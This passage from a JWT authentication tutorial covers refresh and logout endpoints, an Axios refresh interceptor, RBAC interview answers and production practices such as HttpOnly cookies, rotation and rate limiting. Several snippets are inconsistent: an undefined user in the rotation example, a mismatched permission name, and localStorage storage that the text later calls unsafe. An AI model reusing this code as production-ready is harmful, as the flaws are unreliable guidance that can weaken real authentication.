    const storedToken = await db.query(
      'SELECT * FROM refresh_tokens WHERE user_id = $1',
      [decoded.userId]
    );
    
    if (!storedToken || !(await bcrypt.compare(refreshToken, storedToken.token_hash))) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }
    
    // Get fresh user data
    const user = await db.query('SELECT * FROM users WHERE id = $1', [decoded.userId]);
    
    // Generate new access token
    const accessToken = generateAccessToken({
      userId: user.id,
      email: user.email,
      role: user.role
    });
    
    res.json({ accessToken });
  } catch (error) {
    res.status(401).json({ error: 'Refresh failed' });
  }
});

// 5. Logout endpoint
app.post('/auth/logout', async (req, res) => {
  const { refreshToken } = req.body;
  
  const decoded = verifyRefreshToken(refreshToken);
  
  // Delete refresh token from database
  await db.query('DELETE FROM refresh_tokens WHERE user_id = $1', [decoded.userId]);
  
  res.json({ message: 'Logged out' });
});
```

**Client-side handling:**

```typescript
// Axios interceptor for automatic refresh
axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // Token expired?
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      
      try {
        // Refresh token
        const { data } = await axios.post('/auth/refresh', {
          refreshToken: localStorage.getItem('refreshToken')
        });
        
        // Save new access token
        localStorage.setItem('accessToken', data.accessToken);
        
        // Retry original request
        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh failed, redirect to login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);
```

**Key decisions:**

1. **Store refresh tokens in database** - Allows revocation
2. **Hash refresh tokens** - Even if DB compromised, can't use tokens
3. **Get fresh user data** - Access token has latest role/permissions
4. **Automatic retry** - Client handles expiration transparently

### Q5: How would you implement role-based access control (RBAC) with JWT?

**Answer:**

**1. Include role in token:**

```typescript
const accessToken = generateAccessToken({
  userId: user.id,
  email: user.email,
  role: 'admin'  // ← Role in token
});
```

**2. Create authorization middleware:**

```typescript
function authorize(allowedRoles: string[]) {
  return (req, res, next) => {
    // req.user set by authenticate middleware
    if (!req.user) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    
    next();
  };
}
```

**3. Apply to routes:**

```typescript
// Public route
app.get('/api/products', async (req, res) => {
  // Anyone can access
});

// User-only route
app.get('/api/users/profile', authenticate, authorize(['user', 'admin']), async (req, res) => {
  // Only users and admins
});

// Admin-only route
app.delete('/api/users/:id', authenticate, authorize(['admin']), async (req, res) => {
  // Only admins
});
```

**4. Advanced: Permission-based (fine-grained):**

```typescript
// Token with permissions
const accessToken = generateAccessToken({
  userId: user.id,
  email: user.email,
  role: 'editor',
  permissions: ['read:articles', 'write:articles', 'delete:own-articles']
});

// Permission check middleware
function requirePermission(permission: string) {
  return (req, res, next) => {
    if (!req.user?.permissions?.includes(permission)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Apply to routes
app.post('/api/articles', authenticate, requirePermission('write:articles'), async (req, res) => {
  // Create article
});

app.delete('/api/articles/:id', authenticate, requirePermission('delete:articles'), async (req, res) => {
  // Delete article
});
```

---

## 💡 SECTION 8: PRODUCTION BEST PRACTICES

### 1. Token Storage

```typescript
// ❌ BAD: localStorage (vulnerable to XSS)
localStorage.setItem('accessToken', token);

// ✅ GOOD: Memory + HttpOnly cookie
// Access token: In memory (React state)
const [accessToken, setAccessToken] = useState(null);

// Refresh token: HttpOnly cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // JS can't access
  secure: true,      // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});
```

### 2. Token Rotation

```typescript
// Rotate refresh token on each use
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // Verify old token
  const decoded = verifyRefreshToken(oldRefreshToken);
  
  // Generate NEW refresh token
  const newRefreshToken = generateRefreshToken({ userId: decoded.userId });
  
  // Invalidate old token
  await redis.set(`revoked:${decoded.jti}`, '1', 7 * 24 * 60 * 60);
  
  // Return new tokens
  res.cookie('refreshToken', newRefreshToken, { httpOnly: true });
  res.json({ accessToken: generateAccessToken(user) });
});
```

### 3. Rate Limiting

```typescript
// Limit login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 attempts
  message: 'Too many login attempts'
});

app.post('/auth/login', loginLimiter, async (req, res) => {
  // Login logic
});

// Limit refresh attempts
const refreshLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 10,  // 10 attempts
  message: 'Too many refresh attempts'
});

app.post('/auth/refresh', refreshLimiter, async (req, res) => {
  // Refresh logic
});
```

### 4. Monitoring

```typescript
// Log authentication events
logger.info('User login', {
  userId: user.id,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  jti: decoded.jti
});

// Alert on suspicious activity
if (await redis.incr(`failed-login:${email}`) > 10) {
  alertSecurity(`Multiple failed logins for ${email}`);
}

// Track token usage
logger.info('Token used', {
  jti: decoded.jti,
  endpoint: req.path,
  timestamp: Date.now()
});
```

### 5. Secret Rotation

```typescript
// Support multiple secrets (graceful rotation)
const JWT_SECRETS = [
  process.env.JWT_SECRET,      // Current
  process.env.JWT_SECRET_OLD   // Previous (grace period)
];

function verifyWithMultipleSecrets(token: string) {
  for (const secret of JWT_SECRETS) {
    try {
      return jwt.verify(token, secret);
    } catch (err) {
      continue;  // Try next secret
    }
  }
  throw new UnauthorizedError('Invalid token');
}

// Rotation process:
// 1. Add new secret as JWT_SECRET
// 2. Move old secret to JWT_SECRET_OLD
// 3. Wait for all tokens to expire (7 days)
// 4. Remove JWT_SECRET_OLD
```

---

**🎓 END OF PART 3**

Part 3 covered:
- ✅ Token verification functions (verifyAccessToken, verifyRefreshToken, verifyServiceToken)
- ✅ Utility functions (decodeTokenUnsafe, getTokenExpiry, getTokenTTL, generateTokenPair)
- ✅ Full authentication architecture diagrams
- ✅ MAANG interview questions with detailed answers
- ✅ Production best practices

**🎉 M05: JWT AUTH DEEP DIVE COMPLETE!**

You've mastered:
- JWT fundamentals and token structure
- Access vs refresh vs service tokens
- Token generation with proper security
- Token verification and error handling
- Authentication flows and architecture
- Security vulnerabilities and defenses
- Production-ready implementation patterns
- Interview preparation for MAANG companies

**Next module:** M06-AUTH-MIDDLEWARE-DEEP-DIVE
